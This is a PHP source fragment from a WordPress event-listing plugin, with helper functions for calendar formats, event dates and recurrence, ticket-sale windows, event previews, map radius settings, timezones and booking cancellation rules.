if ( ! function_exists( 'el_calendar_time_format' ) ) {
	function el_calendar_time_format () {

		$EL_Setting = EL()->options->general;
		return $EL_Setting->get('calendar_time_format') == '' ? '12' : __( $EL_Setting->get('calendar_time_format'), 'eventlist' );
		
	}
}

if ( ! function_exists( 'el_calendar_language' ) ) {
	function el_calendar_language () {

		$EL_Setting = EL()->options->general;
		return $EL_Setting->get('calendar_language', 'en-GB') ? __( $EL_Setting->get('calendar_language'), 'eventlist' ) : 'en-GB';
		
	}
}




//Lets add Open Graph Meta Info
add_action( 'wp_head', 'el_add_meta_share_facebook', 5 );
function el_add_meta_share_facebook() {

	el_get_template( 'single/share_facebook.php' );

}



// Get WeekDay, Day, Month individual
function el_get_event_w_d_m( $event_id, $type="full" ){

	$time_start = get_post_meta( $event_id, OVA_METABOX_EVENT . 'start_date_str', true  );

	$option_calendar = get_post_meta( $event_id, OVA_METABOX_EVENT.'option_calendar', true);
	$calendar_recurrence = get_post_meta( $event_id, OVA_METABOX_EVENT.'calendar_recurrence', true);
	$calendar = get_post_meta( $event_id, OVA_METABOX_EVENT.'calendar', true);

	$arr_start_date = [];
	if ($option_calendar == 'auto') {
		if ( $calendar_recurrence ) {
			foreach ( $calendar_recurrence as $value ) {
				if ( ( strtotime($value['date']) - strtotime('today') ) >= 0 ) {
					$arr_start_date[] = strtotime( $value['date'] .' '. $value['start_time'] );
				}
			}
		}
	} else {
		if ($calendar) {
			foreach ( $calendar as $value ) {
				if ( ( strtotime($value['date']) - strtotime('today') ) >= 0 ) {
					$arr_start_date[] = strtotime( $value['date'] .' '. $value['start_time'] );
				}
			}
		}
	}

	if ( $arr_start_date != array() ) {
		$start_date = min($arr_start_date);
	} else {
		$start_date = $time_start;
	}

	if ( !empty($time_start) ) {

		$month_type = $type == 'full' ? 'F' : 'M';

		$month = $start_date ? date_i18n($month_type, $start_date) : '';
		$day = $start_date ? date_i18n('d', $start_date) : '';
		$weekday = $start_date ? date_i18n('l', $start_date) : ''; 

		return array(  'weekday' => $weekday, 'day' => $day, 'month' => $month );

	}else{
		return false;
	}

}


/**
 * Validate selling Ticket
 */
function el_validate_selling_ticket( $start_time, $end_time ){

	$current_time = current_time('timestamp');

	if ( $current_time < $start_time || ( $current_time > $start_time && $current_time < $end_time && apply_filters( 'el_allow_book_opening_event', true ) ) ) {
		return true;
	}
	return false;
}

// validate can preview event
function el_can_preview_event(){

	if( isset( $_GET['p'] ) && is_user_logged_in() ){

		if( verify_current_user_post( $_GET['p'] ) && get_post_status( $_GET['p'] ) !== 'publish'  ){

			add_filter( 'body_class', 'el_custom_class' );
			add_filter( 'pre_get_document_title', 'el_filter_document_title' );

			return true;
		}
		return false;
	}
	
}


if( !function_exists('el_custom_class') ){
	function el_custom_class( $classes ) {
	    if ( el_can_preview_event() ) {
	        $classes[] = 'single single-event';
	    }
	    return $classes;
	}
}


function el_filter_document_title( $title ) {

    $title = isset( $_GET['p'] ) ? get_the_title( $_GET['p'] ) : $title;

    return $title; 

}


// Add Min, Max, radius
add_action( 'wp_head', 'el_map_range_radius', 5 );
function el_map_range_radius() { ?>

	<script type="text/javascript">
		var map_range_radius = <?php echo apply_filters( 'el_map_range_radius', 50 ); ?>;
		var map_range_radius_min = <?php echo apply_filters( 'map_range_radius_min', 0 ); ?>;
		var map_range_radius_max = <?php echo apply_filters( 'map_range_radius_max', 100 ); ?>;
	</script>
	

<?php }


// Get time zone of event
function el_get_timezone_event( $eid ){
	if( apply_filters( 'el_show_timezone', true ) ){
		return get_post_meta( $eid, OVA_METABOX_EVENT.'time_zone', true );
	}
}


// Check Cancel Booking
function el_cancellation_booking_valid( $booking_id ){

	$check = false;
	
	// ID of event in booking
	$event_id = get_post_meta( $booking_id, OVA_METABOX_EVENT.'id_event', true );

	// Calendar's ID of ticket in booking
	$id_cal  = get_post_meta( $booking_id, OVA_METABOX_EVENT.'id_cal', true );

	if( get_post_meta( $event_id, OVA_METABOX_EVENT.'allow_cancellation_booking', true ) == 'yes' ){

		$event_start_date = el_get_calendar_core( $event_id, $id_cal );	
		$event_start_date_tmp = strtotime( $event_start_date['date'].' '.$event_start_date['start_time'] );

		$cancel_before_x_day = floatval( get_post_meta( $event_id, OVA_METABOX_EVENT.'cancel_before_x_day', true) )*24*60*60;

		if( $event_start_date_tmp - current_time( 'timestamp' ) > $cancel_before_x_day ) $check = true;
	}

	$cond_other_cancel_booking_valid = apply_filters( 'cond_other_cancel_booking_valid', true, $booking_id );

	return ( $check && $cond_other_cancel_booking_valid );
	

}


// Function to get all the dates in given range 
function el_getDatesFromRange($start, $end, $format = 'Y-m-d') { 
      
    // Declare an empty array 
    $array = array(); 
      
    // Variable that store the date interval 
    // of period 1 day 
    $interval = new DateInterval('P1D'); 
  
    // $realEnd = new DateTime($end); 
    // $realEnd->add($interval); 
  
    $period = new DatePeriod(new DateTime($start), $interval, new DateTime($end)); 
  
    // Use loop to store date into array 
    foreach($period as $date) {                  
        $array[] = strtotime( $date->format($format));  
    } 
  
    // Return the array elements 
    return $array; 
} 

// placeholder dateformat
function el_placeholder_dateformat(){

	$time = el_calendar_time_format();
	$format = el_date_time_format_js();
	return apply_filters( 'el_placeholder_dateformat', el_date_time_format_js_reverse($format) );

}

// placeholder timeformat
function el_placeholder_timeformat(){
	$time = el_calendar_time_format();
	$format = el_date_time_format_js();
	
	return ( $time == '12' ) ? esc_html__( 'HH:MM PM', 'eventlist' ) : esc_html__( 'HH:MM', 'eventlist' );
}
